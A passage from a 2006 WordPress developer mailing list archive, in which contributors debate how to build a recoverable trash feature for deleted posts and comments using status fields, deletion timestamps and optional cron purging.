If you insist on a new column, then make it a NULL-capable date field. 
If the field is NULL, then it's not deleted.  If it is not null, then it 
contains the date the record was deleted.  Every query on those tables 
will then need to check whether that column is NULL to make sure it's 
not returning deleted items.  Since all queries should already be 
checking their status fields directly (post_status = 'publish' will 
automatically ignore rows using the status of 'deleted'), using a flag 
field will be more coding work, data storage, and query overhead for not 
much more gain.

Owen

From skippy at skippy.net  Sun Feb 12 16:17:57 2006
From: skippy at skippy.net (Scott Merrill)
Date: Sun Feb 12 16:19:42 2006
Subject: [wp-hackers] Forum Usefulness (was Data recovery)
In-Reply-To: <001301c62fea$b1ef71b0$6e01a8c0@sixfour>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com>	<43EF397C.2040600@skippy.net>
	<001301c62fea$b1ef71b0$6e01a8c0@sixfour>
Message-ID: <43EF5FB5.8000803@skippy.net>

David Chait wrote:
> FYI, I don't believe the forums are really a useful place for asking 
> questions of users...  It is extremely fragmented (okay, unless you sticky a 
> post on the homepage), and I'm sure not everyone makes it there.  

No wonder so many people feel that WordPress development is driven from
on high, and is largely removed from what users actually want.

Sure, the forums can be noisy.  Sure, people may ask for (or even
demand) the moon without realizing the scope of their requests.

A new forum section could easily be made to consolidate these sorts of
questions from the development team.  Users who are casually interested
in the development of WordPress, but not interested in enough in
following this mailing list, could be encouraged to participate in the
threads opened in this new section.  For all the talk about "what users
want", this seems like a pretty easy way to collect some real, publicly
verifiable information on what (at least some) users want.

> Wordpress.com, et al, users probably don't visit much as they are told to go 
> elsewhere -- yet that's a growing base of 'usability testing' given it's 
> limits.

Yeah, it's a darn shame that so few people participating in this list
see any kind of overview of common support / feature requests submitted
directly to the wordpress.com power structure.  Maybe a lot of these
arguments would be averted if this information were made (more) public,
or summarized in some meaningful way (a la the Google zietgeists, or
Sifry's quarterly summaries).

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From steagl at people.it  Sun Feb 12 16:10:51 2006
From: steagl at people.it (Stefano)
Date: Sun Feb 12 16:31:56 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
	<001801c62feb$42812de0$6e01a8c0@sixfour>
Message-ID: <u2nuu15s52gb1dii6shvv22s4icu9p92oo@4ax.com>

Il Sun, 12 Feb 2006 10:44:49 -0500, "David Chait"
<davebytes@comcast.net> scrive:

>didn't consider the 'how to put things back' for posts vs comments vs ...  I 
>think the period-prefix thing is a potential query bottleneck...
>
>do we simply need a 'trash' flag on all major object tables?  that just 
>seems overkill in one sense, in another it simplifies stuff greatly.

I'm for the trash flag too instead that prepending chars to other
fields.

What about the comments marked spam by plugin like askimet? WHen it
deletes them automatically thy will be gone forever or change status
to deleted?

Another not full related problem, actually navigtion in post/comments
it's a pain, a paged system would be necesary in case you get 300
comments deleted and 10 are deleted by mystakes. Maybe the
implementation fo the trashbin panel screen could introduce a sort of
paging system used in alla pages that present large amounts of data

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From mhancock at us.net  Sun Feb 12 16:35:01 2006
From: mhancock at us.net (Michael E. Hancock)
Date: Sun Feb 12 16:36:40 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><43EF397C.2040600@skippy.net>
	<001301c62fea$b1ef71b0$6e01a8c0@sixfour>
Message-ID: <006001c62ff2$45cece10$6402a8c0@DELL8600>

From: "David Chait" <davebytes@comcast.net>
> FYI, I don't believe the forums are really a useful place for asking
> questions of users...

There's some irony here because it was an accidental deletion of a post in
the Forums by one of the ops that seemed to get this whole thread started.

Michael E. Hancock

From davebytes at comcast.net  Sun Feb 12 16:36:31 2006
From: davebytes at comcast.net (David Chait)
Date: Sun Feb 12 16:38:08 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><001801c62feb$42812de0$6e01a8c0@sixfour>
	<43EF5E1D.6030505@midnightcircus.com>
Message-ID: <002101c62ff2$7b6e5fe0$6e01a8c0@sixfour>

Owen Winkler wrote:
| David Chait wrote:
| > I'm happy with any solution that is reasonably quick to query, and takes
| > minimal-if-any resources to exclude from queries.  If you have to query 
a
| > secondary table, or test a character, that'll make it more difficult to
| > 'exclude'.  That's why I proposed post-status==trash, though I 
admittedly
| > didn't consider the 'how to put things back' for posts vs comments vs 
...  I
| > think the period-prefix thing is a potential query bottleneck...
| >
| > do we simply need a 'trash' flag on all major object tables?  that just
| > seems overkill in one sense, in another it simplifies stuff greatly.
|
| When did "delete" come to mean "possibly store it somewhere for
| convenient for later retrieval, just in case you didn't really want to
| actually, you know, delete it"?  I never saw any delete buttons labeled
| "Throw this away, but put it somewhere I can get it later if I made a
| mistake".  I can see the advantage of letting users recover from their
| mistakes, but geez.

Ummm, usability folks?  I think there was a recent link here to an article 
about the Scott Adams disaster, which noted that the usability of web apps 
just stinks when it comes to things like deleting items.  I mean, my OS has 
a trash can, my email app has a trash can... ;)

| In any case, using a separate trash table to hold all of this data seems
| silly when the affected tables have a status column that could be set to
| "deleted".  The only thing you lose is the status prior to deletion,
| which would be set to the status with the least impact, for example,
| "draft" or "0"/"moderate".  Everything else would already be set properly.

First, I never said use a separate table -- I said a separate flag/field. 
Second, I'm the one who suggested setting the status column to 'trash' in 
the first place! ;)

| Deletion dates (if you want to purge deleted things via cron) could be
| stored in postmeta.  For comments, that's a bit trickier.  Are we going
| to add the commentmeta table?  If so, there's the natural place for it.
|  If not, then the purge cron action can simply store (in options) the
| comment ids of all of the comments that it didn't purge during the last
| purge event.  It will only purge comments that are stored in this list.
|
| If you insist on a new column, then make it a NULL-capable date field.
| If the field is NULL, then it's not deleted.  If it is not null, then it
| contains the date the record was deleted.  Every query on those tables
| will then need to check whether that column is NULL to make sure it's
| not returning deleted items.  Since all queries should already be
| checking their status fields directly (post_status = 'publish' will
| automatically ignore rows using the status of 'deleted'), using a flag
| field will be more coding work, data storage, and query overhead for not
| much more gain.

I don't insist on new anything.  I floated an initial idea of status==trash, 
which got responded to by "how does it get restored", which led me to float 
the flag idea... :)

I'm all for storing deletion timestamp and original post_status in the 
post-meta.  Sounds great.  No need for a flag.  No need for another field or 
table for posts.  Comments are a separate topic -- though I agree, 
comment_approved (once made into a varchar) could ALSO be set to 'trash'.

I'd prefer the wp-cron-purge thing be an optional implementation, not the 
default.  How hard is it to click over to the "Trash" page, and click the 
"Yes, really nuke all of these" button, maybe once every two weeks?  I just 
dislike house-cleaning thingys running on their own (I'm a C++ programmer, 
not Java! ;) ;) ).

-d 

From mhancock at us.net  Sun Feb 12 16:43:19 2006
From: mhancock at us.net (Michael E. Hancock)
Date: Sun Feb 12 16:44:56 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com>
	<001801c62feb$42812de0$6e01a8c0@sixfour>
Message-ID: <008001c62ff3$6e2d51a0$6402a8c0@DELL8600>

From: "David Chait" <davebytes@comcast.net>
> do we simply need a 'trash' flag on all major object tables?  that just
> seems overkill in one sense, in another it simplifies stuff greatly.

Since Matt is considering using the bliki plugin as a replacement for Codex,
maybe something there regarding the tracking of revisions AND deletions is
useful to consider.

Michael E. Hancock


From wp at igeek.info  Sun Feb 12 16:45:09 2006
From: wp at igeek.info (Amit Gupta)
Date: Sun Feb 12 16:46:58 2006
Subject: [wp-hackers] Data recovery
References: <43EE5465.1090502@tamba2.org.uk>
Message-ID: <01e801c62ff3$b1f6ae90$57ebd4cb@unicorn>

Podz <podz@tamba2.org.uk> wrote:
|  Right now, if you delete a post or a comment then it really is 
deleted.
|  Unrecoverable.
|  Shouldn't either:
|  - the warning be beefed up a bit, or
|  - the data be made recoverable ?
|
|  Users are used to a recycle bin, and gearing WP toward multiple users 
it
|  would seem a decent option to be able to recover anything deleted 
within
|  a timescale set by the blog owner.
|  As usual I haven't the slightest clue how to do it, but I would 
imagine
|  such a feature would be well received.

to the question of how to do it, here's what came off in my mind right 
now.
whatever's being deleted, be it a comment or a post(or page), it can be
tagged with a timestamp when it was deleted. now WP can check to see at
some regular interval if there is any stuff that's beyond the allowed 
time &
can purge those items. and the other items whose lifespan in the 
purgatory
isn't over yet, they can be displayed on a page in the admin section, 
each
with two buttons(Recover & Delete) which allows each item to be
recovered or deleted individually. also a mass delete or recover option 
would
be very well recieved!! :)

any thoughts, bouquets or brickbats? :)

------------
Amit Gupta
http://www.amitgupta.in/
http://igeek.info/  ||  http://blog.igeek.info/
http://blog.igeek.info/wp-plugins/igsyntax-hiliter
From davebytes at comcast.net  Sun Feb 12 16:57:17 2006
From: davebytes at comcast.net (David Chait)
Date: Sun Feb 12 16:58:57 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><43EF397C.2040600@skippy.net><001301c62fea$b1ef71b0$6e01a8c0@sixfour>
	<006001c62ff2$45cece10$6402a8c0@DELL8600>
Message-ID: <002b01c62ff5$61eb4760$6e01a8c0@sixfour>

Don't get me wrong -- I think the forums DO give us indication of issues 
users are seeing.  I just don't feel >at the moment< there's a good facility 
for doing 'surveys' (does bbPress >have< a survey feature?), nor a good way 
to 'direct' people there.  Again, at the moment...

And, actually, while that may have started this thread, there was a thread 
earlier about a usability article that noted that current deletion 
interfaces in web apps stink. ;)

----- Original Message ----- 
From: "Michael E. Hancock" <mhancock@us.net>
To: <wp-hackers@lists.automattic.com>
Sent: Sunday, February 12, 2006 11:35 AM
Subject: Re: [wp-hackers] Data recovery (post_status?)


| From: "David Chait" <davebytes@comcast.net>
| > FYI, I don't believe the forums are really a useful place for asking
| > questions of users...
|
| There's some irony here because it was an accidental deletion of a post in
| the Forums by one of the ops that seemed to get this whole thread started. 

From ringmaster at midnightcircus.com  Sun Feb 12 16:58:06 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sun Feb 12 16:59:54 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <002101c62ff2$7b6e5fe0$6e01a8c0@sixfour>
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><001801c62feb$42812de0$6e01a8c0@sixfour>
	<43EF5E1D.6030505@midnightcircus.com>
	<002101c62ff2$7b6e5fe0$6e01a8c0@sixfour>
Message-ID: <43EF691E.5070206@midnightcircus.com>

David Chait wrote:
> Ummm, usability folks?  I think there was a recent link here to an article 
> about the Scott Adams disaster, which noted that the usability of web apps 
> just stinks when it comes to things like deleting items.  I mean, my OS has 
> a trash can, my email app has a trash can... ;)

Yes, I read the Scott Adams thing, which had a bunch of good points. 
And yet through the whole thing I kept thinking, "Who chooses to 
'delete' hundreds of comments (with the intention of keeping them!) 
without having tested a recovery plan?"

I didn't see any trash can in WP, nor did I see the word "Trash", nor 
did I see any sign of anything vaguely like "Recover".  I'm not sure 
what implication I can take away from the word "Delete" other than that 
it will actually do what it says.

> | In any case, using a separate trash table to hold all of this data seems
> | silly when the affected tables have a status column that could be set to
> | "deleted".  The only thing you lose is the status prior to deletion,
> | which would be set to the status with the least impact, for example,
> | "draft" or "0"/"moderate".  Everything else would already be set properly.
> 
> First, I never said use a separate table -- I said a separate flag/field. 
> Second, I'm the one who suggested setting the status column to 'trash' in 
> the first place! ;)

Re: Separate table.  I didn't mean you, David.  It was someone else in 
the thread.  I like your idea of using the status field.  ;)

> I'd prefer the wp-cron-purge thing be an optional implementation, not the 
> default.  How hard is it to click over to the "Trash" page, and click the 
> "Yes, really nuke all of these" button, maybe once every two weeks?  I just 
> dislike house-cleaning thingys running on their own (I'm a C++ programmer, 
> not Java! ;) ;) ).

Ah...  I would prefer all of this recycle bin business to be an optional 
implementation.  If we set the appropriate enum fields to varchars like 
we had been discussing, and ensured that the appropriate hooks executed 
in the delete actions, anyone could implement this however they like via 
plugin.

If someone makes a really great plugin, we could consider distributing 
it with the core.

Owen

From davebytes at comcast.net  Sun Feb 12 16:59:22 2006
From: davebytes at comcast.net (David Chait)
Date: Sun Feb 12 17:01:10 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><001801c62feb$42812de0$6e01a8c0@sixfour>
	<008001c62ff3$6e2d51a0$6402a8c0@DELL8600>
Message-ID: <003301c62ff5$ac4b5930$6e01a8c0@sixfour>

Hmmm.  Interesting.  Revision tracking has been discussed before -- is 
storing delta-diffs (like subversion) overly difficult as part of the save 
process?  I know it's been a request previously... separate topic/thread?

----- Original Message ----- 
From: "Michael E. Hancock" <mhancock@us.net>
To: <wp-hackers@lists.automattic.com>
Sent: Sunday, February 12, 2006 11:43 AM
Subject: Re: [wp-hackers] Data recovery (post_status?)


| From: "David Chait" <davebytes@comcast.net>
| > do we simply need a 'trash' flag on all major object tables?  that just
| > seems overkill in one sense, in another it simplifies stuff greatly.
|
| Since Matt is considering using the bliki plugin as a replacement for 
Codex,
| maybe something there regarding the tracking of revisions AND deletions is
| useful to consider. 

From davebytes at comcast.net  Sun Feb 12 17:15:18 2006
From: davebytes at comcast.net (David Chait)
Date: Sun Feb 12 17:16:56 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><001801c62feb$42812de0$6e01a8c0@sixfour><43EF5E1D.6030505@midnightcircus.com><002101c62ff2$7b6e5fe0$6e01a8c0@sixfour>
	<43EF691E.5070206@midnightcircus.com>
Message-ID: <003801c62ff7$e6732050$6e01a8c0@sixfour>

Owen wrote:
| David Chait wrote:
| > Ummm, usability folks?  I think there was a recent link here to an 
article
| > about the Scott Adams disaster, which noted that the usability of web 
apps
| > just stinks when it comes to things like deleting items.  I mean, my OS 
has
| > a trash can, my email app has a trash can... ;)
|
| Yes, I read the Scott Adams thing, which had a bunch of good points.
| And yet through the whole thing I kept thinking, "Who chooses to
| 'delete' hundreds of comments (with the intention of keeping them!)
| without having tested a recovery plan?"
|
| I didn't see any trash can in WP, nor did I see the word "Trash", nor
| did I see any sign of anything vaguely like "Recover".  I'm not sure
| what implication I can take away from the word "Delete" other than that
| it will actually do what it says.

When I'm not earning a living as a coder (which I'm not lately! ;)), I do 
tech-support for family, friends, and referrals... Again, an average user 
 >might< expect that something which 'deletes' has an 'undo' of some form 
(whether 'undo' or 'trash can'....).  And even with that, I can't tell you 
how many times I've had to help recover deleted files... Accidents happen, 
and undo/restore is a useful usability feature.  Yes, the concept does NOT 
currently exist in WP -- which doesn't mean it is bad, nor that people don't 
(at some level) potentially expect the 'undo/restore' ability from 
experience with desktop apps.. :)

The Scott Adams thing was used as a mindblowing example.  You'd think 
backups should be enough.  Then again, I don't back up frequently enough.  I 
don't use RCS for my own local code like I should.  I like systems that 
protect me from my own stupidity. ;)  The recent addition to the 
conversation of revision storage (semi-'undo'..) is another parallel 
concept.  Actually, site5 has been testing out this 'flashback' concept, 
which basically automatically keeps revision snapshots of your site files. 
Sounds like it's a bit overkill, but then again my level and usage is not 
likely representative of the average website owners these days -- and nice 
to know there's yet-another system protecting me from myself. :)

Anyway, I think we've got consensus on the concept, but I'm in total 
agreement with you on making it least-intrusive on the query system and 
coding (I've been custom-tweaking WP queries for two years now... ;) ).  At 
the same time, deliver an improved product that supports average users, less 
technical users, with better usability.

=d 

From aaron at technosailor.com  Sun Feb 12 17:14:35 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Sun Feb 12 18:11:16 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <43EF691E.5070206@midnightcircus.com>
Message-ID: <20060212181113.67D3061F9@comox.textdrive.com>

> Yes, I read the Scott Adams thing, which had a bunch of good points.
> And yet through the whole thing I kept thinking, "Who chooses to
> 'delete' hundreds of comments (with the intention of keeping them!)
> without having tested a recovery plan?"
> 
> I didn't see any trash can in WP, nor did I see the word "Trash", nor
> did I see any sign of anything vaguely like "Recover".  I'm not sure
> what implication I can take away from the word "Delete" other than that
> it will actually do what it says.
> 
> > | In any case, using a separate trash table to hold all of this data
> seems
> > | silly when the affected tables have a status column that could be set
> to
> > | "deleted".  The only thing you lose is the status prior to deletion,
> > | which would be set to the status with the least impact, for example,
> > | "draft" or "0"/"moderate".  Everything else would already be set
> properly.
> >
> > First, I never said use a separate table -- I said a separate
> flag/field.
> > Second, I'm the one who suggested setting the status column to 'trash'
> in
> > the first place! ;)
> 
> Re: Separate table.  I didn't mean you, David.  It was someone else in
> the thread.  I like your idea of using the status field.  ;)

I would have to agree with the notion of a status flag as opposed to a whole new data repository.

> When did "delete" come to mean "possibly store it somewhere for convenient > for later retrieval, just in case you didn't really want to actually, you > know, delete it"?  I never saw any delete buttons labeled "Throw this
> away, but put it somewhere I can get it later if I made a mistake".  I can  
> see the advantage of letting users recover from their mistakes, but geez.

I do have to chime in on the "concept" of a Recycle Bin having merit.  There IS precedent for having a Recycle Bin or similar functionality.  Call it Purgatory if you don't want to call it a Recycle Bin.  Every desktop UI since the early days of the Mac and Windows 3.1 and possibly before that has had a Recycle Bin implementation because R&D proves that users DO delete things often and accidentally. I do it and I guarantee you do it. 

The concept has merit and should not be pushed off on plugins because one or two people don't like the idea.  I know WordPress is all about simplicity but that is simple and basic functionality that, although missing from many web UIs, should not be. We're a user-centric platform and I think that the conversation should remain, as it is now, centered around "how" not "why".

My 2 cents.

From wp at ebroder.net  Sun Feb 12 18:42:35 2006
From: wp at ebroder.net (Evan Broder)
Date: Sun Feb 12 18:43:50 2006
Subject: [wp-hackers] HTTP Auth/URL Rewriting
Message-ID: <43EF819B.5040207@ebroder.net>

Is anybody still looking at this - http://trac.wordpress.org/ticket/2397?

I've been trying to hack around the .htaccess file, but I don't know 
mod_rewrite well enough to do anything about it.

- Evan
From elharo at metalab.unc.edu  Sun Feb 12 19:11:32 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Sun Feb 12 19:13:14 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <43EF5E1D.6030505@midnightcircus.com>
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>	<ebe43d680602120426u20523b8m@mail.gmail.com>	<001801c62feb$42812de0$6e01a8c0@sixfour>
	<43EF5E1D.6030505@midnightcircus.com>
Message-ID: <43EF8864.9040701@metalab.unc.edu>

Owen Winkler wrote:

> When did "delete" come to mean "possibly store it somewhere for 
> convenient for later retrieval, just in case you didn't really want to 
> actually, you know, delete it"?  I never saw any delete buttons labeled 
> "Throw this away, but put it somewhere I can get it later if I made a 
> mistake".  I can see the advantage of letting users recover from their 
> mistakes, but geez.

20 years ago when Apple invented the trash can. Bruce Tognazzini 
explains this in detail here:

http://www.asktog.com/columns/069ScottAdamsMeltdown.html

The size of even the largest WordPress databases is trivial. Everything 
should be undoable. There's little reason to be overly aggressive about 
deleting things. Possibly one might wish a secure delete to erase 
embarrassing  or incriminating information, but as far as I know neither 
WordPress nor your typical SQL database has ever provided such 
functionality.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From dmhouse at gmail.com  Sun Feb 12 20:14:18 2006
From: dmhouse at gmail.com (David House)
Date: Sun Feb 12 20:15:58 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <43EF691E.5070206@midnightcircus.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<ebe43d680602120211g681b3a23t@mail.gmail.com>
	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
	<001801c62feb$42812de0$6e01a8c0@sixfour>
	<43EF5E1D.6030505@midnightcircus.com>
	<002101c62ff2$7b6e5fe0$6e01a8c0@sixfour>
	<43EF691E.5070206@midnightcircus.com>
Message-ID: <ebe43d680602121214x48bdbc5fp@mail.gmail.com>

On 12/02/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> Yes, I read the Scott Adams thing, which had a bunch of good points.
> And yet through the whole thing I kept thinking, "Who chooses to
> 'delete' hundreds of comments (with the intention of keeping them!)
> without having tested a recovery plan?"
>
> I didn't see any trash can in WP, nor did I see the word "Trash", nor
> did I see any sign of anything vaguely like "Recover".  I'm not sure
> what implication I can take away from the word "Delete" other than that
> it will actually do what it says.

I really don't understand your point, Owen. You don't seem to have
mentioned _any_ reasons why we shouldn't include this recycle bin
concept.

You press Delete in your file manager. Is it a hopeless cause? No,
it's in the recycle bin (unless you use KDE, where 'Trash' means put
it in the trash can and 'Delete' means purge, but that's semantics).
You select some text in your text editor, and press Delete. Is it
gone? No, it's only a Ctrl+Z away.

Users screw up. Saying "you didn't have a recovery plan, tough." is
not going to win us any fans. Including a deleted_timestamp column is
completely trivial and should be done, simply becxause it makes life
safer for our users and there is very little possible loss indeed.
Personally I think gaving this column on the posts and comments table
is essential, and we should also include it on links and users as it'd
be useful occasionally.

> Ah...  I would prefer all of this recycle bin business to be an optional
> implementation.  If we set the appropriate enum fields to varchars like
> we had been discussing, and ensured that the appropriate hooks executed
> in the delete actions, anyone could implement this however they like via
> plugin.

No-one would install this plugin until after they'd accidentally
deleted their masterpiece. It's then no good. I see no real reason for
this not to be core.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From wp at ebroder.net  Sun Feb 12 20:37:19 2006
From: wp at ebroder.net (Evan Broder)
Date: Sun Feb 12 20:38:17 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <20060212181113.67D3061F9@comox.textdrive.com>
References: <20060212181113.67D3061F9@comox.textdrive.com>
Message-ID: <43EF9C7F.3040005@ebroder.net>

I think what makes the most sense is to have a *_status = "deleted" 
option and then store any other relevant information in a wp_trashmeta 
table. This would allow the cron-esque trash purge to go to a single 
place for information, while interfering minimally with other tables.

On a side note, perhaps comment_approved could be changed to 
comment_status. That way a value of "deleted" would make more sense.

- Evan
From ringmaster at midnightcircus.com  Sun Feb 12 21:20:43 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sun Feb 12 21:22:36 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <ebe43d680602121214x48bdbc5fp@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<ebe43d680602120211g681b3a23t@mail.gmail.com>
	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
	<001801c62feb$42812de0$6e01a8c0@sixfour>	<43EF5E1D.6030505@midnightcircus.com>
	<002101c62ff2$7b6e5fe0$6e01a8c0@sixfour>	<43EF691E.5070206@midnightcircus.com>
	<ebe43d680602121214x48bdbc5fp@mail.gmail.com>
Message-ID: <43EFA6AB.4020608@midnightcircus.com>

David House wrote:
> I really don't understand your point, Owen. You don't seem to have
> mentioned _any_ reasons why we shouldn't include this recycle bin
> concept.

I never said we shouldn't have a recycle bin concept.  Yay for data 
recovery!

It seems I have a very different idea about how users should be 
responsible for the sanctity of their data, and that adding features to 
account for (however fleeting, accidental, or gross) user incompetence 
are *convenience features* made out to seem required by UI experts.

Seriously, I expect that at some point someone will recommend that we 
have a recycle heap into which we dump things from the recycle bin when 
it's purged, and then if we really, really didn't mean to delete it, 
we're still able to get it back.  It's like the software development 
version of political correctness.

Maybe I'm just getting crotchety, but when I click "Delete", I always 
mean it.  Maybe I regret it later, but I'm willing to live with it.  I 
don't see it as a failing in the software when I make a mistake.  It 
would be nice if it could recover, but I'm never shocked or disappointed 
by software that doesn't.  Maybe it's because "Undo" is a concept that I 
did not grow up with.

Anyway, sorry to have dropped off my baggage on your doorstep.  I won't 
mention it again.  Consider me on the data recovery party wagon from 
here on out.

And now that I'm clearly on board...

Undeleting categories will be a minor nightmare.  What would be the 
greater faux pas: Providing no undelete or providing undelete on posts 
but not on categories?  Arguably, deleting a category is more difficult 
to recover from than deleting a post.  Besides that, consistency is neat.

Owen
From ml_wordpress at copperleaf.org  Sun Feb 12 22:04:49 2006
From: ml_wordpress at copperleaf.org (ml_wordpress@copperleaf.org)
Date: Sun Feb 12 22:06:40 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <43EFA6AB.4020608@midnightcircus.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<ebe43d680602120211g681b3a23t@mail.gmail.com>
	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
	<001801c62feb$42812de0$6e01a8c0@sixfour>
	<43EF5E1D.6030505@midnightcircus.com>
	<002101c62ff2$7b6e5fe0$6e01a8c0@sixfour>
	<43EF691E.5070206@midnightcircus.com>
	<ebe43d680602121214x48bdbc5fp@mail.gmail.com>
	<43EFA6AB.4020608@midnightcircus.com>
Message-ID: <43EFB101.8080600@copperleaf.org>

Owen Winkler wrote:

> Undeleting categories will be a minor nightmare.  What would be the 
> greater faux pas: Providing no undelete or providing undelete on posts 
> but not on categories?  Arguably, deleting a category is more 
> difficult to recover from than deleting a post.  Besides that, 
> consistency is neat.

For me, deleting a category is a *very* rare event. The one time I did 
it, I made sure I had a current backup (and subsequently did restore the 
delete). I would vote for undelete functionality for posts/pages and 
even comments since it seems to me they would be the more common cases.

Bill
From nuclearmoose at gmail.com  Sun Feb 12 23:27:25 2006
From: nuclearmoose at gmail.com (Craig)
Date: Sun Feb 12 23:29:07 2006
Subject: [wp-hackers] Data recovery
In-Reply-To: <20060211214445.GK1070@kimmo.suominen.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
Message-ID: <5aa3aa0602121527n612927cfgfe2781cf607dd81a@mail.gmail.com>

Kimmo said:
"Rather than copy data around in the database, using flag fields would
be more efficient."

+1.

Craig.
From elharo at metalab.unc.edu  Sun Feb 12 23:40:52 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Sun Feb 12 23:42:33 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <43EFA6AB.4020608@midnightcircus.com>
